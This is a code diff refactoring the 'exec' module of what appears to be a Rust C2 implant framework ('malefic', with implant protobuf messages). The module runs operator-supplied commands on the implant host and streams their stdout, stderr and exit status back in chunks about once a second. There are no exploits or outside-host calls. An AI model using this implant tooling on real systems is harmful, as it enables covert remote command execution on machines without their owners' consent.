@@ -1,15 +1,51 @@
 use crate::{check_request, Module, TaskResult};
 use async_trait::async_trait;
+use futures::{AsyncReadExt, FutureExt, SinkExt};
+use futures::channel::mpsc::{self, UnboundedReceiver, UnboundedSender};
+use futures_timer::Delay;
+use malefic_helper::common::process::{async_command, run_command};
 use malefic_proto::proto::implantpb::spite::Body;
 use malefic_proto::proto::modulepb::ExecResponse;
 use malefic_trait::module_impl;
 use std::time::Duration;
-use futures::{AsyncReadExt, FutureExt, SinkExt};
-use futures_timer::Delay;
-use malefic_helper::common::process::run_command;
-use async_process::{Command, Stdio};
 
 pub struct Exec {}
+
+#[derive(Debug)]
+enum OutputData {
+    Stdout(Vec<u8>),
+    Stderr(Vec<u8>),
+}
+
+// 异步读取管道数据并发送到 channel
+async fn read_pipe_async<R: AsyncReadExt + Unpin + Send>(
+    mut reader: R,
+    sender: UnboundedSender<OutputData>,
+    is_stdout: bool,
+) {
+    let mut buffer = vec![0; 4096];
+
+    loop {
+        match reader.read(&mut buffer).await {
+            Ok(0) => break, // EOF
+            Ok(n) => {
+                let data = buffer[..n].to_vec();
+                let output = if is_stdout {
+                    OutputData::Stdout(data)
+                } else {
+                    OutputData::Stderr(data)
+                };
+
+                if sender.unbounded_send(output).is_err() {
+                    break; // Channel 已关闭
+                }
+            }
+            Err(_) => break, // 读取错误
+        }
+    }
+}
+
+
 
 #[async_trait]
 #[module_impl("exec")]
@@ -28,66 +64,62 @@ impl crate::ModuleImpl for Exec {
         let mut exec_response = ExecResponse::default();
 
         if request.realtime && request.output {
-            // 使用 async_process 的 Command
-            let mut child = Command::new(&request.path)
-                .args(&request.args)
-                .stdout(Stdio::piped())
-                .stderr(Stdio::piped())
-                .spawn()?;
+            let mut child = async_command(request.path, request.args)?;
+            let stdout = child.stdout.take().unwrap();
+            let stderr = child.stderr.take().unwrap();
+            let pid = child.id();
 
-            let mut stdout = child.stdout.take().unwrap();
-            let mut stderr = child.stderr.take().unwrap();
-
+            let (sender_ch, mut receiver_ch) = mpsc::unbounded::<OutputData>();
+            let stdout_task = read_pipe_async(stdout, sender_ch.clone(), true);
+            let stderr_task = read_pipe_async(stderr, sender_ch, false);
+            let background_task = async { futures::join!(stdout_task, stderr_task); }.fuse();
+            futures::pin_mut!(background_task);
+            
+            let collect_data = |receiver: &mut UnboundedReceiver<OutputData>| -> (Vec<u8>, Vec<u8>) {
+                let (mut stdout_data, mut stderr_data) = (Vec::new(), Vec::new());
+                while let Ok(Some(data)) = receiver.try_next() {
+                    match data {
+                        OutputData::Stdout(data) => stdout_data.extend_from_slice(&data),
+                        OutputData::Stderr(data) => stderr_data.extend_from_slice(&data),
+                    }
+                }
+                (stdout_data, stderr_data)
+            };
+            
             loop {
-                let mut response = ExecResponse{
-                    status_code: -1,
-                    stdout: vec![],
-                    stderr: vec![],
-                    pid: child.id(),
-                    end: false,
-                };
-                
-                let mut has_data = false;
+                futures::select! {
+                    _ = Delay::new(Duration::from_secs(1)).fuse() => {
+                        let (stdout_data, stderr_data) = collect_data(&mut receiver_ch);
 
-                // 等待1秒
-                Delay::new(Duration::from_secs(1)).await;
-
-                // 读取stdout
-                let mut buf = vec![0; 8192];
-                match stdout.read(&mut buf).now_or_never() {
-                    Some(Ok(n)) if n > 0 => {
-                        buf.truncate(n);
-                        has_data = true;
-                        response.stdout = buf;
+                        if !stdout_data.is_empty() || !stderr_data.is_empty() {
+                            let response = ExecResponse {
+                                pid,
+                                stdout: stdout_data,
+                                stderr: stderr_data,
+                                end: false,
+                                ..Default::default()
+                            };
+                            sender.send(TaskResult::new_with_body(id, Body::ExecResponse(response))).await?;
+                        }
                     }
-                    Some(Err(e)) => return Err(e.into()),
-                    _ => {} // 无数据或仍在等待
-                }
+                    _ = background_task => {
+                        let (stdout_data, stderr_data) = collect_data(&mut receiver_ch);
+                        let status_code = child.try_status().ok().flatten().map(|s| s.code().unwrap_or(0)).unwrap_or(-1);
 
-                // 非阻塞读取stderr
-                let mut buf = vec![0; 8192];
-                match stderr.read(&mut buf).now_or_never() {
-                    Some(Ok(n)) if n > 0 => {
-                        buf.truncate(n);
-                        has_data = true;
-                        response.stderr = buf;
+                        let response = ExecResponse {
+                            pid,
+                            stdout: stdout_data,
+                            stderr: stderr_data,
+                            status_code,
+                            ..Default::default()
+                        };
+                        sender.send(TaskResult::new_with_body(id, Body::ExecResponse(response))).await?;
+                        break;
                     }
-                    Some(Err(e)) => return Err(e.into()),
-                    _ => {} // 无数据或仍在等待
-                }
-                // 检查进程是否已退出
-                if let Some(status) = child.try_status()? {
-                    response.status_code = status.code().unwrap_or(0);
-                    response.pid = child.id();
-                    exec_response = response;
-                    break;
-                } else if has_data {
-                    sender.send(TaskResult::new_with_body(id, Body::ExecResponse(response))).await?;
                 }
             }
         } else {
-            // 非实时模式保持原样
-            let child = run_command(request.path, request.args, request.output)?;
+            let child = run_command(request.path, request.args)?;
             exec_response.pid = child.id();
             let output = child.wait_with_output()?;
 
